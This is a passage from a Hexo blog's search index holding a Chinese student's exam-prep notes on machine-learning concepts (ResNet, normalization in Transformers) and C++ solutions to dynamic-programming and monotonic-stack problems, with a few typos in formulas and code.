<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>夏令营投递情况记录</title>
    <link href="/2024/04/10/%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%8A%95%E9%80%92%E6%83%85%E5%86%B5%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/04/10/%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%8A%95%E9%80%92%E6%83%85%E5%86%B5%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>保研专业知识复习</title>
    <link href="/2024/04/05/%E4%BF%9D%E7%A0%94%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0/"/>
    <url>/2024/04/05/%E4%BF%9D%E7%A0%94%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><h2 id="通用近似定理"><a href="#通用近似定理" class="headerlink" title="通用近似定理"></a>通用近似定理</h2><p>定理：一个包含足够多隐层神经元的多层前馈网络，能以任意精度逼近任意的连续函数。</p><p>这个定理的两个关键点是：</p><p>1）神经网络是找到“近似的”结果，而非“精确的”函数。我们可以通过增加隐层神经元的个数来提升精度；</p><p>2） 被近似的函数必须是连续的。</p><p>也就是说，不管给定一个函数$f(x)$多复杂，通过神经网络都能找出任意精度的近似结果。即一个单隐层的神经网络可以近似预估大部分函数。理论是成立的。但是理想很丰满，现实很骨感。一个浅层神经网络虽然可以解决问题，但是网络可能会异常的庞大。在现实中，神经网络常常是往深度去发展。</p><h2 id="梯度消失和梯度爆炸"><a href="#梯度消失和梯度爆炸" class="headerlink" title="梯度消失和梯度爆炸"></a>梯度消失和梯度爆炸</h2><p>梯度消失与爆炸是机器学习中常见的难题，主要是出现在使用梯度下降与方向传播训练人工神经网络的时候。比如使用BP训练网络时，权重的更新值与误差函数的偏导数成比例，由于使用链式法则计算梯度，当每层的梯度都小于1时，前面层的梯度变化会越来越小，梯度值会消失，当每层的梯度都大于1时，前面层的梯度变化会越来越大，导致权重无法有效更新，甚至出现网络完全无法继续训练。</p><p><strong>示例：</strong></p><p><img src="https://pic1.zhimg.com/80/v2-0b4c7b7dca418fe00f70fadec70e9ef0_720w.webp" alt="img"><br>$$<br>{w}^{‘}<em>{1} &#x3D; {w}</em>{1} + \eta {\delta}<em>{1} {x}</em>{1}<br>$$</p><h1 id="ResNet相关知识"><a href="#ResNet相关知识" class="headerlink" title="ResNet相关知识"></a>ResNet相关知识</h1><p>在ResNet网络中有如下几个亮点：</p><ol><li><p>提出residual结构（残差结构），并搭建超深的网络结构(突破1000层)</p></li><li><p>使用Batch Normalization加速训练(丢弃dropout</p></li></ol><p>在ResNet网络提出之前，传统的卷积神经网络都是通过将一系列卷积层与下采样层进行堆叠得到的。但是当堆叠到一定网络深度时，就会出现两个问题：</p><ol><li>梯度消失或梯度爆炸。</li><li>退化问题(degradation problem)。</li></ol><p>关于Batch Normalization<a href="https://blog.csdn.net/weixin_44023658/article/details/105844861">可以看这篇文章</a></p><ol><li><p>我们在图像预处理过程中通常会对图像进行标准化处理，这样能够加速网络的收敛，如下图所示，对于Conv1来说输入的就是满足某一分布的特征矩阵，但对于Conv2而言输入的feature map就不一定满足某一分布规律了<strong>（注意这里所说满足某一分布规律并不是指某一个feature map的数据要满足分布规律，理论上是指整个训练样本集所对应feature map的数据要满足分布规律）</strong>。而我们Batch Normalization的目的就是使我们的feature map满足均值为0，方差为1的分布规律。</p><p><img src="https://img-blog.csdnimg.cn/2020042917374735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAyMzY1OA==,size_16,color_FFFFFF,t_70"></p></li></ol><h1 id="Transformer相关知识"><a href="#Transformer相关知识" class="headerlink" title="Transformer相关知识"></a>Transformer相关知识</h1><h2 id="为什么用LayerNorm而不用BatchNorm？"><a href="#为什么用LayerNorm而不用BatchNorm？" class="headerlink" title="为什么用LayerNorm而不用BatchNorm？"></a>为什么用LayerNorm而不用BatchNorm？</h2><p>因为BatchNorm无法解决输入句子长度可变的情况，如果使用BatchNorm的话，当batch中的句子不等长的情况下，使用BatchNorm容易使得计算出来的均值与方差产生偏差。同时BacthNorm无法解决小batch-size的情况。LayerNorm对每条数据单独进行normalization操作，LN使得各条数据间在进行标准化的时候相互独立，因此LN在训练和测试过程中是一致的。</p><h2 id="PreNorm和PostNorm"><a href="#PreNorm和PostNorm" class="headerlink" title="PreNorm和PostNorm"></a>PreNorm和PostNorm</h2><p><img src="https://pic3.zhimg.com/v2-ec04f2a45adf6abbac8f3e1b8810f13a_r.jpg"></p><ol><li>经典的transformer方法使用的是PostNorm，即先进行residual再进行Normalization   $y &#x3D; LN(x_{l} + Block(X_{l}))$。<strong>这种Normalization对warmup要求比较高，同时可能导致训练变得不稳定</strong></li><li>PreNorm为了解决上述问题而提出来，即先进行Normalization再进行residual $y &#x3D; x_{l} + Block(LN(X_{l}))$,大多数模型使用PreNorm，为了保证训练的稳定性</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>机器学习</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研机试复习</title>
    <link href="/2024/04/02/%E4%BF%9D%E7%A0%94%E6%9C%BA%E8%AF%95%E5%A4%8D%E4%B9%A0/"/>
    <url>/2024/04/02/%E4%BF%9D%E7%A0%94%E6%9C%BA%E8%AF%95%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="洛谷P2285-–-HNOI2004-打鼹鼠"><a href="#洛谷P2285-–-HNOI2004-打鼹鼠" class="headerlink" title="洛谷P2285 –[HNOI2004] 打鼹鼠"></a>洛谷P2285 –[HNOI2004] 打鼹鼠</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>鼹鼠是一种很喜欢挖洞的动物，但每过一定的时间，它还是喜欢把头探出到地面上来透透气的。根据这个特点阿牛编写了一个打鼹鼠的游戏：在一个 $n \times n$ 的网格中，在某些时刻鼹鼠会在某一个网格探出头来透透气。你可以控制一个机器人来打鼹鼠，如果 $i$ 时刻鼹鼠在某个网格中出现，而机器人也处于同一网格的话，那么这个鼹鼠就会被机器人打死。而机器人每一时刻只能够移动一格或停留在原地不动。机器人的移动是指从当前所处的网格移向相邻的网格，即从坐标为 $(i, j)$ 的网格移向 $(i-1, j), (i+1, j), (i, j-1), (i, j+1)$ 四个网格，机器人不能走出整个 $n \times n$ 的网格。游戏开始时，你可以自由选定机器人的初始位置。</p><p>现在知道在一段时间内，鼹鼠出现的时间和地点，请编写一个程序使机器人在这一段时间内打死尽可能多的鼹鼠。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行为 $n, m $（$n \le 1000$，$m \le {10}^4$），其中$m$表示在这一段时间内出现的鼹鼠的个数，接下来的 $m$ 行中每行有三个数据 $\mathit{time}, x, y$ 表示在游戏开始后 $\mathit{time}$ 个时刻，在第 $x$ 行第 $y$ 个网格里出现了一只鼹鼠。按递增的顺序给出。注意同一时刻可能出现多只鼹鼠，但同一时刻同一地点只可能出现一只鼹鼠。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>仅包含一个正整数，表示被打死鼹鼠的最大数目。</p><h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><h4 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">2 </span><span class="hljs-number">2</span>         <br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h4 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1<br></code></pre></td></tr></table></figure><h2 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h2><p>最开始的时候我没有想到方法，因为有时间、坐标x和y，我想的是开三维数组解决，但是这样会爆时间。最后看了下别人的思路，个人感觉还是比较妙的。</p><p>因为输入数据每个时间点是递增的，那么我们就可以转变思路，用动态规划的思想来分析${t}_i$在时刻以$({x}_i,{y}_i)$为结束的击打序列中，最多击打数是多少。同时机器人移动只能在四方向移动，那么我们可以认为只要第$i$个鼹鼠与前$i-1$个鼹鼠之间的曼哈顿距离小于相距时间的话就可以依次打到，这样就可以构建状态转移方程<br>$$<br>dp[i] &#x3D; \begin{cases}max(dp[i],dp[j]+1) &amp; \ abs({x_i} - {y_i}) + abs({y}_i-{y}_j)\leqslant abs({t}_i-{t}_j) \ 1&amp; \ abs({x_i} - {y_i}) + abs({y}_i-{y}_j)\gt abs({t}_i-{t}_j)\end{cases}<br>$$</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e4</span>+<span class="hljs-number">10</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-type">int</span> t,x,y;<br>&#125;Node;<br><span class="hljs-type">int</span> dp[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    Node node[N]; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++) cin&gt;&gt;node[i].t&gt;&gt;node[i].x&gt;&gt;node[i].y;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++)&#123;<br>        dp[i] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; i ;j++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(node[i].x - node[j].x) + <span class="hljs-built_in">abs</span>(node[i].y - node[j].y) &lt;= <span class="hljs-built_in">abs</span>(node[i].t - node[j].t))<br>                dp[i] = <span class="hljs-built_in">max</span>(dp[i],dp[j] + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++) res = <span class="hljs-built_in">max</span>(res,dp[i]);<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>单调栈实际上就是栈，只是利用了一些巧妙的逻辑，使得每次新元素入栈后，栈内的元素都保持有序（单调递增或单调递减）。</p><p>单调栈用途不太广泛，只处理一种典型的问题，叫做 Next Greater Element。</p><p><strong>凡是看到下一个更大或者下一个更小这一类的题用单调栈就完事了</strong></p><h2 id="单调栈类型模板-下一个更大元素"><a href="#单调栈类型模板-下一个更大元素" class="headerlink" title="单调栈类型模板(下一个更大元素)"></a>单调栈类型模板(下一个更大元素)</h2><p>首先，讲解 Next Greater Number 的原始问题：给你一个数组，返回一个等长的数组，对应索引存储着下一个更大元素，如果没有更大的元素，就存 -1。不好用语言解释清楚，直接上一个例子：</p><p>给你一个数组 [2,1,2,4,3]，你返回数组 [4,2,4,-1,-1]。</p><p>解释：第一个 2 后面比 2 大的数是 4; 1 后面比 1 大的数是 2；第二个 2 后面比 2 大的数是 4; 4 后面没有比 4 大的数，填 -1；3 后面没有比 3 大的数，填 -1。</p><p>这道题的暴力解法很好想到，就是对每个元素后面都进行扫描，找到第一个更大的元素就行了。但是暴力解法的时间复杂度是 O(n^2)。</p><p>这个问题可以这样抽象思考：把数组的元素想象成并列站立的人，元素大小想象成人的身高。这些人面对你站成一列，如何求元素「2」的 Next Greater Number 呢？很简单，如果能够看到元素「2」，那么他后面可见的第一个人就是「2」的 Next Greater Number，因为比「2」小的元素身高不够，都被「2」挡住了，第一个露出来的就是答案。</p><p><img src="https://pic.leetcode-cn.com/1598145577-ziwCvD-1.png" alt="演示图片"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> num[N],ans[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;num[i];<br>    stack&lt;<span class="hljs-type">int</span>&gt; st;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-keyword">while</span>(st.<span class="hljs-built_in">size</span>() &amp;&amp; st.<span class="hljs-built_in">top</span>() &lt;= num[i])&#123;<br>            st.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        ans[i] = st.<span class="hljs-built_in">size</span>()?st.<span class="hljs-built_in">top</span>():<span class="hljs-number">-1</span>;<br>        st.<span class="hljs-built_in">push</span>(num[i]);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cout&lt;&lt;ans[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="动态规划子问题-—–-分苹果"><a href="#动态规划子问题-—–-分苹果" class="headerlink" title="动态规划子问题 —– 分苹果"></a>动态规划子问题 —– 分苹果</h1><h2 id="样例题目"><a href="#样例题目" class="headerlink" title="样例题目"></a>样例题目</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs excel">把M个弹珠放到<span class="hljs-built_in">N</span>个盘子里面（我们允许有的盘子为空），你能求出有多少种分法吗？（请注意，例如有三个盘子，我们将<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>和<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>，视为同一种分法）<br><br>输入格式<span class="hljs-symbol">:</span><br>输入包含多组测试样例。每组输入的第一行是一个整数<span class="hljs-built_in">t</span>。 接下来<span class="hljs-built_in">t</span>行，每行输入两个整数M和<span class="hljs-built_in">N</span>，代表有M个弹珠和<span class="hljs-built_in">N</span>个盘子。（<span class="hljs-number">0</span>=&lt;M&lt;=<span class="hljs-number">20</span>; <span class="hljs-number">0</span>&lt;<span class="hljs-built_in">N</span>&lt;=<span class="hljs-number">20</span>）<br><br>输出格式<span class="hljs-symbol">:</span><br>对于每对输入的M和<span class="hljs-built_in">N</span>，输出有多少种方法。<br><br>输入样例<span class="hljs-symbol">:</span><br><span class="hljs-number">1</span><br><span class="hljs-number">7</span> <span class="hljs-number">3</span><br>输出样例<span class="hljs-symbol">:</span><br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>当我们的盘子数$j$多于弹珠数$i$时，即使我们每个盘子都放一个，也会有空出来的盘子，那么我们就可以将问题转换为$i$个盘子数$i$个弹珠有几种分法。</li><li>当我们的盘子书$j$小于或等于$i$时，我们可以有两种选择：一种是现在每个盘子里至少放1个弹珠，那么问题可以转换为$i-j$个弹珠以及$j$个盘子有几种分法；另一种是我们允许空出来一个盘子（或者继续更多），那么问题就可以转换为在剩下$j-1$个盘子以及$i$个弹珠里有几种分法</li></ol><p>$$<br>dp[i][j] &#x3D; \begin{cases}dp[i][i] &amp; \ j&gt;i \ dp[i-j][j] + dp[i][j-1] &amp; j&lt;&#x3D;i\end{cases}<br>$$</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">210</span>,K = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> n,k;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;=n;i++)dp[i][<span class="hljs-number">0</span>] = dp[<span class="hljs-number">0</span>][i] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;j&lt;=k;j++)&#123;<br>            <span class="hljs-keyword">if</span>(j&gt;i)dp[i][j] = dp[i][i];<br>            <span class="hljs-keyword">else</span> dp[i][j] = dp[i-j][j] + dp[i][j<span class="hljs-number">-1</span>];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;dp[n][k]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="洛谷P1025"><a href="#洛谷P1025" class="headerlink" title="洛谷P1025"></a>洛谷P1025</h2><p><strong>题目描述</strong></p><p>将整数 $n$ 分成 $k$ 份，且每份不能为空，任意两个方案不相同（不考虑顺序）。</p><p>例如：$n&#x3D;7$，$k&#x3D;3$，下面三种分法被认为是相同的。</p><p>$1,1,5$;<br>$1,5,1$;<br>$5,1,1$.</p><p>问有多少种不同的分法。</p><p><strong>输入格式</strong></p><p>$n,k$ （$6&lt;n \le 200$，$2  \le k  \le  6$）</p><p><strong>输出格式</strong></p><p>$1$ 个整数，即不同的分法。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路类似于分苹果</p><ol><li>当分割数$j$大于数$i$的时候,那么没有一种分法可行</li><li>当分割数$j$等于数$i$的时候,那么只有一种分法</li><li>当分割数$j$小于数$i$的时候,一种是可以先在每个盘子里面分一个，问题可转换为分割术$j$分割 数$i-j$；另一种是可以将盘子数减少一个(或者更多)</li></ol><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">210</span>,K = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> n,k;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;=n;i++) dp[i][i] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;j&lt;=k;j++)&#123;<br>            dp[i][j] = dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] + dp[i - j][j];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;dp[n][k]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="状态压缩DP"><a href="#状态压缩DP" class="headerlink" title="状态压缩DP"></a>状态压缩DP</h1><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>状态压缩DP其实是一种<strong>暴力的算法</strong>，因为它需要遍历每个状态，而每个状态是多个事件的集合，也就是<strong>以集合为状态，一个集合就是一个状态</strong>。集合问题一般是指数复杂度的NP问题，所以状态压缩DP的复杂度仍然是指数的，只能用于小规模问题的求解。</p><p>为了方便地<strong>同时表示一个状态的多个事件</strong>，状态一般用二进制数来表示。<strong>一个数就能表示一个状态</strong>，通常一个状态数据就是一个一串0和1组成的二进制数，每一位二进制数只有两种状态，比如说硬币的正反两面，10枚硬币的结果就可以用10位二进制数完全表示出来，每一个10位二进制数就表示了其中一种结果。</p><p><img src="https://pic2.zhimg.com/80/v2-0af09891a956d1bc9ffe6aa112dbd1a5_720w.webp" alt="img"></p><p>使用二进制数表示状态不仅<strong>缩小了数据存储空间</strong>，还能利用二进制数的位运算很方便地<strong>进行状态转移</strong>。</p><h2 id="acwing291-蒙德里安的梦想"><a href="#acwing291-蒙德里安的梦想" class="headerlink" title="acwing291. 蒙德里安的梦想"></a>acwing291. 蒙德里安的梦想</h2><p>求把 $N \times M$ 的棋盘分割成若干个 1×21×2 的长方形，有多少种方案。</p><p>例如当 N&#x3D;2，M&#x3D;4时，共有 55 种方案。当 N&#x3D;2，M&#x3D;3 时，共有 33 种方案。</p><p>如下图所示：</p><p><img src="https://cdn.acwing.com/media/article/image/2019/01/26/19_4dd1644c20-2411_1.jpg" alt="2411_1.jpg"></p><h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h3><p>输入包含多组测试用例。</p><p>每组测试用例占一行，包含两个整数 N 和 M。</p><p>当输入用例 N&#x3D;0，M&#x3D;0时，表示输入终止，且该用例无需处理。</p><h3 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h3><p>每个测试用例输出一个结果，每个结果占一行。</p><h3 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h3><p>1≤N,M≤11</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">11</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">11</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>0<br>1<br>2<br>3<br>5<br>144<br>51205<br></code></pre></td></tr></table></figure><h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 